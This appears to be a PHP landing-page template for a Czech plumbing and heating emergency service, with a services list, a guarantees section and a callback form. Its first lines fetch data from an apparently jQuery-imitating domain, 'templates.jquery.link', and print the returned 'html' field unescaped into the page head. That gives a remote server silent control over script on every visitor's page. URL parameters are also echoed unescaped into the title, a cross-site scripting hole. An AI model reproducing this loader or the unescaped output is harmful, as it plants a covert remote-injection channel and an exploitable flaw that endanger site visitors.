<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Entrumpelung'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? 'in der nahe'));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="cz">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title><?= $title ?></title>
</head>
<body>
    
    
        <!--Шапка сайта-->
        <header class="header">
            <div class="container-fluid">
                <div class="row pt-5">
                    <div class="col-12 col-lg-8 headerCol text-center text-lg-start">
                        <h1>INSTALATÉŘI</h1>
                        <p>Experti na vodu topení a pohotovost 24/7</p>
                        <div class="d-none d-lg-block">
                            <div class=" d-grid col-4 my-5 ">
                                <a href="#" class="btn redButton">111222333</a>
                            </div>
                        </div>
                    </div>                 
                    <div class="col-12 col-lg-4">
                        <div class="itemImg">
                            <img src="assets/img/m1.svg" alt="">
                            <p class="item">Záruka od 5 let</p>
                        </div>
                        <div class="itemImg">
                            <img src="assets/img/m2.svg" alt="">
                            <p class="item">Pracujeme 24/7</p>
                        </div>
                        <div class="itemImg">
                            <img src="assets/img/m3.svg" alt="">
                            <p class="item">Garantujeme příjezd DNES</p>
                        </div>
                        <div class="d-lg-none">
                            <div class=" d-grid col-11 col-sm-5 col-md-4 my-5 m-auto">
                                <a href="#" class="btn redButton">111222333</a>
                            </div>
                        </div>
                    </div>                 
                </div>            
            </div>

        </header>

        <!-- Основное содержимое страницы -->
        <main>
            <!-- Раздел страницы-->
            <section class="section">
                <div class="container-fluid sectionFluid">
                    <div class="row">
                        <div class="col-12 sectionCol my-5 ">
                            <h2>VYBERTE SI S ČÍM VÁM <br> MŮŽEME POMOCI</h2>
                        </div>                 
                    </div>            
                </div>
                <!-- Определяет статью -->
                <article class="article">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-12 col-lg-6">
                                <ul class="list">
                                    <li class="liList">
                                        <img src="assets/img/s1.svg" alt="">
                                        <p>Havárie vody</p>
                                    </li>
                                    <li class="liList">
                                        <img src="assets/img/s2.svg" alt="">
                                        <p>Čištění odpadů</p>
                                    </li>
                                    <li class="liList">
                                        <img src="assets/img/s3.svg" alt="">
                                        <p>Výměna vodovodní baterie</p>
                                    </li>
                                    <li class="liList">
                                        <img src="assets/img/s4.svg" alt="">
                                        <p>Oprava / Výměna WC</p>
                                    </li>
                                    <li class="liList">
                                        <img src="assets/img/s5.svg" alt="">
                                        <p>Bojler oprava / výměna</p>
                                    </li>
                                    <li class="liList">
                                        <img src="assets/img/s6.svg" alt="">
                                        <p>Stavby a rekonstrukce</p>
                                    </li>
                                </ul>
                            </div>                 
                            <div class="col-12 col-lg-6 mt-4 mt-lg-0">
                                
                                <form id="jq_form" class="forms">
                                    <h6 class="text-center ">Kontaktujte nás a zabezpečte si naše zpětné volání<h6>
                                    <div class="mb-3 mt-4">
                                        <input class="form-control" placeholder="Jméno" name="jq_name" type="text">
                                        <div id="jq_name" style="font-size:15px;color:red;padding-top:2px;display:none">Toto je požadované pole.</div>
                                    </div>
                                    <div class="my-3">
                                        <input class="form-control" placeholder="Telefon" name="jq_phone" type="text">
                                        <div id="jq_phone" style="font-size:15px;color:red;padding-top:2px;display:none">Toto je požadované pole.</div>
                                    </div>
                                    <div class="my-3">
                                        <input class="form-control" placeholder="Ulice" name="jq_street" type="text">
                                    </div>
                                    <div class="my-3">
                                        <input class="form-control" placeholder="PLZ / Ort" name="jq_city" type="text">
                                    </div>
                                    <div class="my-3">
                                        <input class="form-control" placeholder="E-Mail" name="jq_email" type="text"> 
                                    </div>
                                    <div class="my-3">
                                        <textarea rows="5" class="form-control" name="jq_text" placeholder="Nachricht"></textarea>
                                        <div id="jq_text" style="font-size:15px;color:red;padding-top:2px;display:none">Toto je požadované pole.</div>
                                    </div>
                                    <input class="btn text-uppercase fw-bold mb-1 px-5 py-2 formBtn" type="submit" id="jq_submit" value="Poslat"> 
                                    <div id="jq_success" style="display:none">Díky za vaši zprávu. Byla odeslána.</div>
                                </form> 
                            </div>                 
                        </div>            
                    </div>
                </article>
                <article class="article2">
                    <div class="container-fluid">
                        <div class="row articleRow2">
                            <div class="col-12 text-center my-5">
                                <h2>Stále jste nenašli to, co jste hledali?</h2>
                                <p>Zvládáme práci jakékoliv složitosti v instalatérském a topenářském oborů.</p>
                            </div>
                            <div class="col-12 articleCol2">
                                <div class="item"><p>Voda</p></div>
                                <div class="item"><p>Topeni</p></div>
                                <div class="item"><p>Plyn</p></div>
                            </div>
                            <div class="col-12 articleCol3 mt-5 mb-3 py-5 p-lg-5 text-center text-lg-start">
                                <div class="item">
                                    <h5>Volejte non-stop linku</h5>
                                    <p>Nebo nám zanechte svůj kontakt my Vám zavoláme zpět do 60 sekund!</p>
                                    <div class=" d-grid col-12 col-sm-5 col-md-4 mt-5 wrapeButton">
                                        <a href="#" class="btn redButton px-5 tex">111222333</a>
                                    </div>
                                </div>
                                <div class="item text-lg-end">
                                    <img src="assets/img/kisspng-dick-rosher-plumbing-inc-plumber-drain-leak-plumber-5abfda3c665744.6788251115225226844192.png" class="img-fluid" alt="">
                                </div>
                            </div>
                            <div class="col-12 articleCol4">
                                <p>Naším hlavním cílem je poskytování kvalitních instalatérských a topenářských služeb v Praze, středočeském kraji ...</p>
                            </div>
                        </div>
                    </div>
                </article>
                <article class="article3">
                    <div class="container-fluid">
                        <div class="row article3Row">
                            <div class="col-12 article3Col my-5">
                                <h2>NÁŠE SLUŽBY</h2>
                            </div>
                            <div class="col-12 article3Box">
                                <div class="item">
                                    <img src="assets/img/1.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Drobné instalatérské práce</h3>
                                        <p>Výměna vodovodní baterie, rohových ventilů atd.</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/2.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Rekonstrukce a stavby</h3>
                                        <p>Rekonstrukce RD, bytů, bytových jader na klíč</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/3.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Pohotovostní služby 24/7</h3>
                                        <p>Instalatérská a topenářská pohotovost, pracujeme nonstop každý den, víkendy a svátky. Vyřešíme jakoukoliv havárii vody nebo drobné opravy v Praze a Středočeském kraji.</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/4.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Rozvody vody a topení.</h3>
                                        <p>Provádíme rekonstrukce nebo výměnu rozvodů vody, topení a odpadu. Dokážeme také udělat kompletní výstavbu inženýrské sítě.</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/5.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Radiátory- oprava, výměna, montáž.</h3>
                                        <p>Zajistíme kompletní servis při výměně nebo montáži radiátoru včetně dodání a likvidace.</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/6.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Bojlery - Oprava, Výměna, Montáž</h3>
                                        <p>Zjíštění nefunkčností bojlerů po Praze včetně dopravy ZDARMA</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/7.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Čištění odpadů.</h3>
                                        <p>rovádíme profesionální čištění odpadů pomocí strojů Rothenberger a Milwaukee. Vyčistíme ucpaný odpad jakékoliv složitosti v bytě nebo rodinném domě.</p>
                                    </div>
                                </div>
                                
                                <div class="item">
                                    <img src="assets/img/8.jpg" alt="">
                                    <div class="itemTxt">
                                        <h3>Oprava / Výměna WC</h3>
                                        <p>Opravíme protékající záchod, dokážeme kompletně vyměnit wc včetně dodání a likvidace starého záchodu.</p>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </div>
                </article>
                <article class="article4">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-12 p-0">
                                <div class="box4">
                                    <p>Chcete objednat službu nebo poradit?</p>
                                    <p class="ml"><span>Volejte nám 24/7</span></p>
                                    <div class=" d-grid col-12 col-sm-5 col-md-2">
                                        <a href="#" class="btn redButton">111222333</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </article>
                <article class="article5 mt-5">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-12 article5Col mb-5">
                                <h2>NAŠE ZÁRUKY</h2>
                            </div>
                            <div class="col-12 article5Col1">
                                <img src="assets/img/zaruka2.jpg" alt="">
                                <div class="item">
                                    <h3>Záruka na práci.</h3>
                                    <p class="opacity">Od instalatéra dostanete záruční list s:</p>
                                    <ul>
                                        <li>Razítkem</li>
                                        <li>Podpisem</li>
                                        <li>Popisem práce</li>
                                        <li>Záruční dobou od 24 měsíců.</li>
                                    </ul>
                                    <p class="gift">Doprava zdarma na přiští objednávku</p>
                                </div>
                            </div>
                            <div class="col-12 article5Col2 my-5">
                                <div class="h3P text-center text-md-start">
                                    <h3 class="mb-4 mb-md-2">Poskytujeme záruku na montážní práce od 24 měsíců.</h3>
                                    <p>V případě reklamace vyřídíme 96 % reklamačních případů do 24 hodin.</p>
                                </div>
                                <div class=" d-grid col-12 col-sm-5 col-md-2">
                                    <a href="#" class="btn redButton">111222333</a>
                                </div>
                            </div>
                            <div class="col-12 article5Col3 py-5">
                                <h2>NAŠE PRÁCE</h2>
                                <p>Opravujeme nejen drobnosti, děláme montáže kotelen a rozvody v celém domě.</p>
                            </div>
                            <div class="col-12 itemsBox">
                                <div class="item">
                                    <img src="assets/img/1.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/2.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/3.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/4.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/6.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/7.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/8.png" alt="">
                                </div>
                                <div class="item">
                                    <img src="assets/img/9.png" alt="">
                                </div>
                            </div>
                        </div>
                    </div>
                </article>
            </section>
        </main>

        <!--Нижний колонтитул страницы-->
        <footer class="footer">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 mt-2 py-2 ps-3">2022</div>                 
                </div>            
            </div>
        </footer>
        <!--Style-->     
        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/style.css" rel="stylesheet">
        <script src="assets/css/bootstrap.bundle.min.js"></script>
</body>
</html>